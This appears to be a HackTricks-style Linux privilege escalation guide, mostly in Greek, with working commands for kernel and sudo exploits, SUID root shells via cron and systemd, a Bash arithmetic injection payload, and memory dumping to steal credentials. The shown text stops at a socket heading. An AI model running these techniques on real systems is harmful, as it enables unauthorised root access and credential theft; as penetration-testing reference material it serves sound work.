# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας αρχίσουμε να αποκτούμε κάποιες γνώσεις για το OS που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Εάν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη `PATH`** μεταβλητή ίσως να μπορείτε να hijack κάποιες libraries ή binaries:
```bash
echo $PATH
```
### Env info

Υπάρχουν ενδιαφέρουσες πληροφορίες, passwords ή API keys στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα με vulnerable kernel και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλες ιστοσελίδες όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξάγετε όλες τις εκδόσεις του vulnerable kernel από αυτόν τον ιστότοπο μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση για kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτέλεση στο θύμα, ελέγχει μόνο exploits για kernel 2.x)

Πάντα **αναζητήστε την έκδοση kernel στο Google**, ίσως η έκδοση του kernel σας να αναφέρεται σε κάποιο kernel exploit και τότε θα είστε σίγουροι ότι αυτό το exploit είναι έγκυρο.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo έκδοση

Βασισμένο στις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του Sudo πριν από την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς χρήστες να αυξήσουν τα προνόμιά τους σε root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από έναν κατάλογο ελεγχόμενο από τον χρήστη.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν τρέξετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` σας είναι ευάλωτη και ότι υποστηρίζει τη λειτουργία `chroot`.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: η επαλήθευση της υπογραφής απέτυχε

Δείτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτή η vuln θα μπορούσε να εκμεταλλευθεί.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη καταγραφή συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγραφή πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container, μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:

{{#ref}}
docker-security/
{{#endref}}

## Μονάδες δίσκου

Ελέγξτε **τι είναι προσαρτημένο και τι δεν είναι προσαρτημένο**, πού και γιατί. Αν κάτι δεν είναι προσαρτημένο, μπορείτε να προσπαθήσετε να το προσαρτήσετε και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαρίθμηση χρήσιμων binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν είναι εγκατεστημένος **any compiler**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το compile στο μηχάνημα όπου θα το χρησιμοποιήσετε (ή σε ένα παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο ευάλωτο λογισμικό

Ελέγξτε για την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) that could be exploited for escalating privileges…\
Συνιστάται να ελέγξετε χειροκίνητα τις εκδόσεις του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που κατά κύριο λόγο θα είναι άχρηστες, επομένως συνιστάται η χρήση εφαρμογών όπως το OpenVAS ή παρόμοιων που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Διεργασίες

Κοιτάξτε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα προνόμια από ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Παρακολούθηση διεργασιών

Μπορείς να χρησιμοποιήσεις εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείς διεργασίες. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσεις ευάλωτες διεργασίες που εκτελούνται συχνά ή όταν πληρούνται κάποιες προϋποθέσεις.

### Μνήμη διεργασίας

Κάποιες υπηρεσίες ενός server αποθηκεύουν **credentials in clear text inside the memory**.\
Κανονικά θα χρειαστείς **root privileges** για να διαβάσεις τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, οπότε αυτό συνήθως είναι πιο χρήσιμο όταν είσαι ήδη root και θέλεις να ανακαλύψεις περισσότερα credentials.\
Ωστόσο, θυμήσου ότι **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλα τα processes μπορούν να be debugged, αρκεί να έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος που λειτουργούσε το ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο μια parent process μπορεί να be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Μόλις οριστεί, χρειάζεται reboot για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα συγκεκριμένο process ID, τα **maps** δείχνουν πώς η μνήμη αντιστοιχίζεται στον εικονικό χώρο διευθύνσεων της διεργασίας· δείχνουν επίσης τις **permissions κάθε αντιστοιχισμένης περιοχής**. Το ψευδοαρχείο **mem** αποκαλύπτει την ίδια τη μνήμη της διεργασίας. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **seek στο αρχείο mem και να dumpάρουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του πυρήνα μπορεί να προσεγγιστεί χρησιμοποιώντας /dev/kmem.\
Τυπικά, `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και την ομάδα kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για Linux

Το ProcDump είναι μια νέα υλοποίηση για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρείτε το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να dump ένα process memory μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις για root και να dump την process που ανήκει σε εσάς
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από Process Memory

#### Χειροκίνητο παράδειγμα

Αν διαπιστώσετε ότι η authenticator process εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να dump the process (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους για να dump the memory ενός process) και να αναζητήσετε credentials μέσα στη memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα κλέψει **clear text credentials from memory** και από κάποια **well known files**. Απαιτεί root privileges για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                   | Όνομα Διεργασίας     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένα/Cron jobs

### Crontab UI (alseambusher) που τρέχει ως root – web-based scheduler privesc

Εάν ένα web “Crontab UI” panel (alseambusher/crontab-ui) τρέχει ως root και είναι δεσμευμένο μόνο στο loopback, μπορείτε παρόλα αυτά να το προσεγγίσετε μέσω SSH local port-forwarding και να δημιουργήσετε μια privileged job για escalate.

Τυπική αλυσίδα
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Find credentials in operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιούργησε ένα high-priv job και εκτέλεσέ το αμέσως (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποίησέ το:
```bash
/tmp/rootshell -p   # root shell
```
Σκληροποίηση
- Μην τρέχετε το Crontab UI ως root· περιορίστε το σε έναν αφιερωμένο χρήστη με ελάχιστα δικαιώματα
- Δεσμεύστε την υπηρεσία στο localhost και περιορίστε επιπλέον την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε κωδικούς
- Αποφύγετε την ενσωμάτωση secrets σε unit files· χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για on-demand job executions



Ελέγξτε αν κάποιο scheduled job είναι ευάλωτο. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln? μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείς να βρεις το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημείωσε πως ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\\
Τότε, μπορείς να αποκτήσεις ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που χρησιμοποιεί ένα script με wildcard (Wildcard Injection)

Αν ένα script εκτελείται από τον root και έχει ένα “**\***” μέσα σε μια εντολή, μπορείς να το εκμεταλλευτείς για να κάνεις απρόσμενα πράγματα (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Εάν το wildcard προηγείται ενός μονοπατιού όπως** _**/some/path/***_**, δεν είναι ευάλωτο (ούτε καν** _**./***_ **είναι).**

Διαβάστε την παρακάτω σελίδα για περισσότερα wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Η Bash εκτελεί parameter expansion και command substitution πριν από την arithmetic evaluation σε ((...)), $((...)) και let. Εάν ένας root cron/parser διαβάζει μη αξιόπιστα πεδία log και τα τροφοδοτεί σε arithmetic context, ένας attacker μπορεί να εγχύσει ένα command substitution $(...) που εκτελείται ως root όταν τρέχει ο cron.

- Why it works: Στην Bash, οι expansions συμβαίνουν με αυτή τη σειρά: parameter/variable expansion, command substitution, arithmetic expansion, και μετά word splitting και pathname expansion. Οπότε μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` πρώτα υποκαθίσταται (τρέχοντας την εντολή), και μετά το υπόλοιπο αριθμητικό `0` χρησιμοποιείται για το arithmetic ώστε το script να συνεχίσει χωρίς σφάλματα.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Βάλτε attacker-controlled κείμενο μέσα στο parsed log έτσι ώστε το πεδίο που μοιάζει αριθμητικό να περιέχει ένα command substitution και να τελειώνει με ένα digit. Βεβαιωθείτε ότι η εντολή σας δεν γράφει στο stdout (ή ανακατευθύνετέ το) ώστε το arithmetic να παραμένει έγκυρο.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Εάν μπορείτε να **modify a cron script** που εκτελείται από root, μπορείτε να αποκτήσετε ένα shell πολύ εύκολα:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από root χρησιμοποιεί έναν **φάκελο στον οποίο έχετε πλήρη πρόσβαση**, ίσως να είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε έναν symlink φάκελο προς κάποιον άλλο** που εξυπηρετεί ένα script υπό τον έλεγχό σας
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams μερικές φορές "sign" cron-driven binaries κάνοντας dump μιας προσαρμοσμένης ELF section και grepping για ένα vendor string πριν τα εκτελέσουν ως root. Αν αυτό το binary είναι group-writable (π.χ., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) και μπορείτε να leak το signing material, μπορείτε να forge το section και να hijack την cron task:

1. Χρησιμοποίησε `pspy` για να καταγράψεις τη ροή επαλήθευσης. Στην Era, ο root εκτέλεσε `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ακολουθούμενο από `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` και μετά εκτέλεσε το αρχείο.
2. Αναδημιούργησε το αναμενόμενο certificate χρησιμοποιώντας το leaked key/config (από `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Δημιούργησε ένα κακόβουλο replacement (π.χ., drop a SUID bash, add your SSH key) και ενσωμάτωσε το certificate στο `.text_sig` ώστε το grep να περάσει:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Υπεργράψε το προγραμματισμένο binary διατηρώντας τα execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Περίμενε για το επόμενο cron run· μόλις ο naive signature check πετύχει, το payload σου θα τρέξει ως root.

### Frequent cron jobs

Μπορείς να παρακολουθήσεις τις διεργασίες για να εντοπίσεις αυτές που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσεις να το εκμεταλλευτείς και να escalate privileges.

Για παράδειγμα, για να **monitor every 0.1s during 1 minute**, **sort by less executed commands** και να διαγράψεις τις εντολές που έχουν εκτελεστεί τις περισσότερες φορές, μπορείς να κάνεις:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα απαριθμεί κάθε process που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατόν να δημιουργηθεί ένα cronjob **putting a carriage return after a comment** (χωρίς newline character), και το cron job θα λειτουργήσει. Παράδειγμα (note the carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Εγγράψιμα _.service_ αρχεία

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε `.service` αρχείο, αν μπορείτε, **θα μπορούσατε να το τροποποιήσετε** έτσι ώστε να **εκτελεί** το **backdoor όταν** η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **σταματά** (ίσως χρειαστεί να περιμένετε μέχρι το μηχάνημα να κάνει reboot).\
Για παράδειγμα δημιουργήστε το backdoor σας μέσα στο .service αρχείο με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα service binaries

Λάβετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής πάνω σε binaries που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για backdoors ώστε όταν οι υπηρεσίες επανεκτελεστούν τα backdoors να εκτελεστούν.

### systemd PATH - Σχετικές διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Αν βρείτε ότι μπορείτε να **γράψετε** σε οποιονδήποτε από τους φακέλους της διαδρομής, μπορεί να μπορείτε να **ανυψώσετε προνόμια**.  
Πρέπει να αναζητήσετε **χρήση σχετικών διαδρομών σε αρχεία ρυθμίσεων υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιουργήστε ένα **executable** με το **ίδιο όνομα με το binary της σχετικής διαδρομής** μέσα στον systemd PATH φάκελο που μπορείτε να γράψετε, και όταν στην υπηρεσία ζητηθεί να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor** σας θα εκτελεστεί (οι μη προνομιακοί χρήστες συνήθως δεν μπορούν να ξεκινήσουν/σταματήσουν services αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Timers**

**Timers** είναι systemd unit αρχεία των οποίων το όνομα τελειώνει σε `**.timer**` που ελέγχουν `**.service**` αρχεία ή συμβάντα. Οι **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική στο cron καθώς έχουν ενσωματωμένη υποστήριξη για γεγονότα χρονισμού ημερολογίου και γεγονότα μονοτονικού χρόνου και μπορούν να τρέχουν ασύγχρονα.

Μπορείτε να απαριθμήσετε όλους τους Timers με:
```bash
systemctl list-timers --all
```
### Χρονοδιακόπτες με δικαιώματα εγγραφής

Αν μπορείτε να τροποποιήσετε έναν timer, μπορείτε να τον κάνετε να εκτελεί κάποια υπάρχουσα μονάδα systemd.unit (όπως ένα `.service` ή ένα `.target`)
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Επομένως, για να καταχραστείτε αυτή την permission θα χρειαστεί να:

- Βρείτε κάποια systemd unit (όπως `.service`) που **εκτελεί ένα δυαδικό με δικαίωμα εγγραφής**
- Βρείτε κάποια systemd unit που **εκτελεί μια σχετική διαδρομή** και έχετε **δικαιώματα εγγραφής** πάνω στο **systemd PATH** (για να μιμηθείτε αυτό το εκτελέσιμο)

Μάθετε περισσότερα για τα timers με `man systemd.timer`.

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε έναν timer χρειάζεστε δικαιώματα root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

